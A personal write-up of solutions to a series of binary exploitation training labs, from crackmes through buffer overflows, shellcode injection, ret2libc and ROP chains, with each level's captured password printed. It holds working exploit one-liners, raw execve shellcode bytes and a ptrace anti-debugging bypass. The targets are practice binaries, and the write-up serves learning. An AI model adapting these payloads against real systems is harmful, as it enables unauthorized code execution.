----------
Lab 1C
----------

The program reads a number from the terminal and checks if it's equal to a hardcoded value.
The number is 0x149a which is 5274. This is the password.

$ cat /home/lab1B/.pass
n0_str1ngs_n0_pr0bl3m


----------
Lab 1B
----------

The program reads a number and compares it to 0x1337d00d.
If the inputted number is in the range 0x1337d00d - [0, 21], do the following:

	difference = 0x1337d00d - input_number
	use difference as an argument to decrypt().

Else, use a random number as the argument to decrypt().

In decrypt, we take each byte of a string that is initialize with the values shown below. To get a shell, we need the final string to be "Congratulations!". This is done by xoring the initial string with the function argument.

  75 7C 7D 51 67 66 73 60 7B 66 73 7E 33 61 7C 7D 00 <- Initial # Note these are little endian integers; each group of 4 bytes must be in reverse order when actualling doing the XORs
  C  o  n  g  r  a  t  u  l  a  t  i  o  n  s  !  00 <- Desired

Here's a script to compute the xor key (function argument). Difference will result in an array of 18s, so this is the desired difference.

	initial_bytes = [0x51, 0x7D, 0x7C, 0x75, 0x60, 0x73, 0x66, 0x67, 0x7e, 0x73, 0x66, 0x7b, 0x7d, 0x7c, 0x61, 0x33]
	message = "Congratulations!"
	difference = [ord(x) ^ y for x,y in zip(message, initial_bytes)]
	print 0x1337d00d - int(difference[0])

This outputs 322424827, which is the key.

Lessons learned:
	- The initial string was loaded in reverse order because of little-endian format.

$ cat /home/lab1A/.pass
1337_3nCRyptI0n_br0

--------------------
Lab 1A
--------------------

The user inputs two things: a username and serial number.
The username's length must be > 5 and each character must be > 0x1f

First, a seed is generated by doing the following:
	seed = (username[3] ^ 1337) + 5eeded

Then, for each character x in the username:

	// Shortened
	edx = carry((x ^ seed) * 88233B2B)
	seed = seed + (x ^ seed) - (((((x ^ seed) - edx) >> 1) + edx) >> 10) * 1337

	// Original
	eax = x ^ seed
	ecx = x ^ seed
	edx = carry(eax * 88233B2B)
	eax = ((((eax - edx) >> 1) + edx) >> 10) * 1337
	ecx = ecx - eax
	eax = ecx
	seed = seed + eax

The final value of the seed must be equal to the serial that was inputed. To solve this lab, I bypassed the ptrace syscall by setting its return value to 0x1 (it could be anything other than 0xffffffff).
Then, I set a breakpoint on the seed comparison with the serial. I printed out the current value of the serial for my username, and used this as the serial the next time I ran the program.

username: banana
serial: 6232821

Another way to do this is to actually just emulate the instructions that do the calculations using unicorn. I've attached a script that does this called lab1A.py.

Things Learned:
	- ptrace is a syscall that can check other threads' values. It's often used to check if we are in a debugging environment.
	- Easily patch the syscall or just use the bypass_ptrace technique to get around anti-anti debugging techniques.
	- mul instruction has implicit destination and source of eax for the lower 32-bits of the product and edx for the higher 32-bits.
	- How to use unicorn to emulate x86 instructions

Next level:
labXC:lab0Xstart


------------------------
Lab 2C
------------------------

The program takes a single argument, which gets strcpy'd into a buffer. We can overflow this buffer to change another variable to the value 0xdeadbeef to get a shell.
This number has to be entered in little-endian since it is being compared as a number.

./lab2C `python -c 'print "A" * 15 + "\xef\xbe\xad\xde"'`

$ cat /home/lab2B/.pass
1m_all_ab0ut_d4t_b33f

------------------------
Lab 2B
------------------------

The program takes a single argument, which gets strcpy'd into a buffer before being printed out.

There is a function that never gets called "shell", which executes the system() syscall. We can overwrite the return pointer in the echo function to point to the shell function, then put 4 more bytes to represent a fake "return address" that was pushed by a call, and finally the address of the string "/bin/sh" so that the system call starts a shell.

./lab2B `python -c 'print "A" * 27 + "\xBD\x86\x04\x08AAAA\xd0\x87\x04\x08"'`

Here, 0x080486bd is the address of the shell() function, and 0x080487d0 is the address of the string "/bin/sh".
We insert 4 A's between them to represent a fake "reteurn address".

$ cat /home/lab2A/.pass
i_c4ll_wh4t_i_w4nt_n00b

------------------------
Lab 2A
------------------------

The program asks for 10 words using fgets from stdin. The call to fgets allows for 16 bytes, but the buffer itself is only 12 bytes, so there is an obvious buffer overflow. Immediately below the buffer on the stack is the index i, so we are able to overwrite the value of i with whatever we like by simply entering a word larger than 12 bytes.

The input loop continues so long as "i" is not equal to 10 (for 10 words), since it expects the counter to go from 0 to 9. If we overwrite the current word number with a number larger than 10, then we can (almost) indefinitely input words.

Every time a word is entered, its first character is placed into a separate buffer for storage. At the end of the program, this buffer gets printed out.

By inputting a large number of words, we overflow the buffer storing the first characters since there is no check to see if we are writing past its bounds.

Eventually, we can overflow the first letters buffer to overwrite the old base pointer and the return address.

Constructing the payload:
	- Overflow payload
		- 12 characters to fill the word buffer.
		- 13th character >= 10 in ASCII (the counter gets incremented after we input our letters, so 10 is ok as well) to overwrite a byte in the current value of "i".
		- Needs to be sent 24 times since the return address is 24 bytes below the start of the first chars buffer.
	- Address of the shell function, where each byte is separated by a new line (since it's the first letters array that's actually doing the overflowing).
	- Final newline to break out of the "entering words" loop.

python -c 'print "AAAABBBBCCCC\n" * 24 + "\xfd\n\x86\n\x04\n\x08\n" + "\n"' > /tmp/pwnscript
(cat /tmp/pwnscript; cat) | ./lab2A

Things Learned:
	- fgets with stdin only accepts up to n - 1 bytes! It reserves the last byte of the buffer for a NULL byte.
	- fgets with stdin terminates on null bytes or new line characters.
		- So, if you input many bytes without a new line, the remaining bytes after n get queued and used as the next "stdin" value.
		- It also keeps any following newline characters in the buffer
	- If you need a shell after your overflow, you need the "cat" command to keep stdin open; else the program will just end since stdin is closed.
		- The best way to do it is write your bytes to a file, then cat the bytes like so:
			- (cat file; cat) | ./lab2A

------------------------
Lab 3C
------------------------
This problem had us injecting shellcode to get a shell. There are two calls to fgets and both can be overflowed.
- The first call writes to a buffer in the data section (global buffer).
- The second call writes to a buffer in the stack.

We could overflow the stack buffer with shellcode and jump back to it by overwriting the return address with the address of the shellcode.

However, the address of the shellcode on the stack will get randomized since ASLR is on.

An easier way is to write the shellcode in the data section by overflowing the first buffer. This location will be fixed, unlike the stack. Fortunately, this section is also executable, so we can still execute this shellcode.

Since fgets reads until a new line, but the strcmp compares until a null byte, we can pass the null byte check by using the following input:

	python -c 'print "rpisec\x00" + "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80\n" + "A" * 80 + "\x47\x9c\x04\x08"' > /tmp/file

	(cat /tmp/file; cat) | ./lab3C

$ cat /home/lab3B/.pass
th3r3_iz_n0_4dm1ns_0n1y_U!

Things Learned:
	- Data section variable addresses don't change between GDB and the actual binary running.
	- Stack offsets change between GDB and actual binary because of environment variables. The only way to get the actual address is to trial-and-error the return address, or by remote attaching a GDB process to the running process.

------------------------
Lab 3B
------------------------

In IDA, we can see that the program is making a call to "gets" to read user input into a buffer, which is easily overflowed.
The problem arises from the fact that we cannot use simple shellcode that calls "system('/bin/sh')". So instead, we will write shellcode to run `cat /home/lab3A/.pass`.
I used shellcraft to do this, which is a command-line utility installed alongside pwntools.

$ shellcraft i386.linux.cat /home/lab3A/.pass --format asm
    /* push '/home/lab3A/.pass\x00' */
    push 0x73
    push 0x7361702e
    push 0x2f413362
    push 0x616c2f65
    push 0x6d6f682f
    /* open(file='esp', oflag=0, mode='O_RDONLY') */
    mov ebx, esp
    xor ecx, ecx
    xor edx, edx
    /* call open() */
    push SYS_open /* 5 */
    pop eax
    int 0x80
    /* sendfile(out_fd=1, in_fd='eax', offset=0, count=2147483647) */
    push 1
    pop ebx
    mov ecx, eax
    xor edx, edx
    push 0x7fffffff
    pop esi
    /* call sendfile() */
    xor eax, eax
    mov al, 0xbb
    int 0x80

However, this shellcode will not work out-of-the-box because of two problems. First, SYS_open is a constant in pwntools and not an actual instruction, so assemblers won't understand that. You have to replace SYS_open with a "0x5".

Another problem is that we are executing code on the stack, but using push/pop instructions that alter the stack (thus altering the instructions).
To overcome this, you can do two things:

1) Change pushes that are used for inserting values into registers without null bytes like the following:
		- push 0x5
		- pop eax
	becomes:
		- xor eax, eax
		- mov al, 0x5

2) Set the stack pointer to something far away from your instructions before executing the other code.
	Ex. add esp, -0x200

I got lazy and decided to do this to my shellcode instead of dealing with the pushes/pops, so here are my final instructions that I assembled.

	/* Make a bunch of space on the stack */
	add esp, -0x200

	/* push '/home/lab3A/.pass\x00' */
	push 0x73
	push 0x7361702e
	push 0x2f413362
	push 0x616c2f65
	push 0x6d6f682f

	/* open(file='esp', oflag=0, mode='O_RDONLY') */
	mov ebx, esp
	xor ecx, ecx
	xor edx, edx

	/* call open() */
	push SYS_open /* 5 */
	xor eax, eax
	mov ax, 0x5
	int 0x80

	/* sendfile(out_fd=1, in_fd='eax', offset=0, count=2147483647) */
	push 1
	pop ebx
	mov ecx, eax
	xor edx, edx
	push 0x7fffffff
	pop esi

	/* call sendfile() */
	xor eax, eax
	mov al, 0xbb
	int 0x80

I found out that the program behavior changes after 156 bytes of input, and 160 bytes completely overwrites the return address.
My assembled code was 59 bytes, so I needed 90 bytes over NOPs before it. After the shellcode, I have the return address.

Payload:
python -c 'print "\x90" * 97 + "\x81\xc4\x00\xfe\xff\xff\x6A\x73\x68\x2E\x70\x61\x73\x68\x62\x33\x41\x2F\x68\x65\x2F\x6C\x61\x68\x2F\x68\x6F\x6D\x89\xE3\x31\xC9\x31\xD2\x31\xC0\xB0\x05\xCD\x80\x6A\x01\x5B\x89\xC1\x31\xD2\x68\xFF\xFF\xFF\x7F\x5E\x31\xC0\xB0\xBB\xCD\x80" + "\xa0\xf6\xff\xbf"' | ./lab3B

wh0_n33ds_5h3ll3_wh3n_U_h4z_s4nd

Things Learned:
	- How to use shellcraft to get assembly.
	- You can use shellcraft in pwntools to directly create your payload without going to an online assembler by doing:
		- payload += asm(shellcraft.i386.open("/home/XXX"))
	- Your shellcode may clobber the stack where youor instructions are located. You can circumvent this by just subtracting your stack pointer before your code to artificially create space on the stack.
	- To avoid stack operations for the purpose of putting values into your registers, you can do:
		- xor eax, eax
		- mov al, 0x5 // Or whatever constant you need

------------------------
Lab 3A
------------------------

The bug is that we can supply an index and value to write there, and the index is not checked to be in bounds of the array. Therefore, we can write to arbitrary memory locations past the buffer.

To access the saved $eip (the return address), write to index 109. The buffer location will be the return address that we write.
When entering the return address or any bytes, just enter it as a number.

Here is our basic shellcode.

$ shellcraft i386.linux.sh --format asm

    /* execve(path='/bin///sh', argv=['sh'], envp=0) */
    /* push '/bin///sh\x00' */
    push 0x68
    push 0x732f2f2f
    push 0x6e69622f
    mov ebx, esp

    /* push argument array ['sh\x00'] */
    /* push 'sh\x00\x00' */
    push 0x1010101
    xor dword ptr [esp], 0x1016972
    xor ecx, ecx
    push ecx /* null terminate */
    push 4
    pop ecx
    add ecx, esp
    push ecx /* 'sh\x00' */
    mov ecx, esp
    xor edx, edx

    /* call execve() */
    push SYS_execve /* 0xb */
    pop eax
    int 0x80

We have two restrictions that make our shellcode a little more difficult.
	1) (number >> 24) != 0xB7
	2) index % 3 != 0

The biggest restriction is restriction 2 since you can only write to indices not divisible by 3.
Therefore, you will need to include a jump instruction to the next index every other index.
This can be done using PC-relative jumps. The instruction "eb 04" is equivalent to "jmp 0x4", which sets the next PC to 4 bytes ahead.
If I have to fill in bytes, I just prefix with NOP instructions. This solves the restriction where the number cannot start with 0xB7.

Another problem is that the original shellcode generated by shellcraft tries to push the string "sh" with:
	- push 0x1010101
	- xor DWORD PTR [esp], 0x1016972

The xor instruction is 7 bytes long, which doesn't leave 2 bytes for the jump instruction with an 8 byte length restriction. So, I replaced this with a direct "push sh"
	- push 0x6873

I'm also including an additional "add esp, -0x200" to make sure I don't clobber the stack that I'm executing on.

0:  81 c4 00 fe ff ff       add    esp,0xfffffe00
6:  6a 68                   push   0x68
8:  68 2f 2f 2f 73          push   0x732f2f2f
d:  68 2f 62 69 6e          push   0x6e69622f
12: 89 e3                   mov    ebx,esp
14: 68 73 68 00 00          push   0x6873
19: 31 c9                   xor    ecx,ecx
1b: 51                      push   ecx
1c: 6a 04                   push   0x4
1e: 59                      pop    ecx
1f: 01 e1                   add    ecx,esp
21: 51                      push   ecx
22: 89 e1                   mov    ecx,esp
24: 31 d2                   xor    edx,edx
26: 31 c0                   xor    eax,eax
28: b0 0b                   mov    al,0xb
2a: cd 80                   int    0x80

Things Learned:
	- Getting the address of the buffer where the shellcode starts is hard and annoying. It differs between GDB and the actual environment because of environment variables. To get around this, you could use tools like "fixenv" or remotely attaching GDB to the actual running process using pwntools. Then, you can find the actual address of the buffer.
	- Otherwise, you will need to just keep trying different addresses near what it was in GDB. I incremented/decremented by 0x100 until I got a "bad instruction" fault since this indicates that we are probably landing somewhere in the middle of the shellcode. Then, you just adjust until you're at the beginning of the shellcode.
	- It really pays to have a bunch of NOPS in the beginning of the exploit since you can guess wrong into the NOP sled and be fine.
	- JMP relatives exist in x86 and take very few bytes!

	- Tip: IF you know the exact address of the saved return address on the stack for sure, then it might be better for you to just overflow the shellcode AFTER the return address like so:
		- [input][ebp][eip][shellcode]
	This way, you know the shellcode is located directly after your saved instruction pointer!

	- Tip: You can use "ltrace -S -i -f" to trace all system and library function calls. It even prints out the program addresses that cause segfaults and the function calls themselves, and all of this can help you find out what your offset needs to be.



------------------------
Lab 5C
------------------------

Basic gets overflow. I used pattern create and pattern search in peda to find out that the return address is at offset 156.
Next, p system gave me the address of the system function in libc at address 0xb7e63190.
I also need the address of a string "/bin/sh" to pass as an argument to system, which I found at 0xb7f83a24 using find "/bin/sh"

Now to construct my overflow, I need to set up the stack like so:

156 bytes garbage
0xb7e63190 <- address of system()
4 bytes garbage, which system() will think is the return address pushed by a call instruction
0xb7f83a24 <- address of a string "/bin/sh", which system() will think is arg0 to the function.

Finally, remember to pipe the data to a file and read it in through stdin with cat - we will need to keep cat open to use the shell.

python -c 'print "A" * 156 + "\x90\x31\xe6\xb7" + "AAAA" + "\x24\x3a\xf8\xb7"' > /tmp/file
(cat /tmp/file; cat) | ./lab5C
$ cat /home/lab5B/.pass
s0m3tim3s_r3t2libC_1s_3n0ugh

------------------------
Lab 5B
------------------------

We have another simple function using gets, but don't have access to libc - printing out the address of "system" says "No symbol table is loaded."
So we will have to manually create a ROP chain. A give away is a look at the sheer number of imported functions available in the program (as seen in IDA).

First, we find that our offset is at offset 140.
Understanding ROPgadget shellcode:

Put "/bin//sh\x00\x00\x00\x00" into .data section
====================================================
pop edx
@ .data
pop eax
'/bin'
mov dword ptr [edx], eax
pop edx
@ .data + 4
pop eax
'//sh'
mov dword ptr [edx], eax
pop edx
@ .data + 8
xor eax, eax
mov dword ptr [edx], eax

Arguments for execve - ("/bin/sh" (pointer), NULL, NULL). Arg1 is filename to execute, arg2 is an array of arguments to the program being executed, and arg3 is a list of environment variables
Note that invoking a syscall with 0x80 requires eax for the syscall number, ebx for the 1st arg, ecx for 2nd, edx for 3rd.
====================================================
pop ebx
@ .data
pop ecx
@ .data + 8
pop edx
@.data + 8

System Call 11 (execve)
===============================
xor eax, eax
inc eax * 11
int 0x80

th4ts_th3_r0p_i_lik3_2_s33


======================
Alternate Solution
======================
We can use ROPgadget to find ROP gadgets in the binary. ROPgaget also has an option to create a simple ROP chain for you!

The only thing left is to find the return address offset and overflow up to it.

$ ROPgadget --binary ./lab5B --ropchain > /tmp/file.py

In file.py, delete all lines until the end where the autogenerated ROP chain python script exists. Unindent the lines since the are indented. Lastly, include "A" * 140 for the padding, and a print statement to print the payload at the end.

$ (python /tmp/file.py; cat) | ./lab5B
cat /home/lab5A/.pass
th4ts_th3_r0p_i_lik3_2_s33
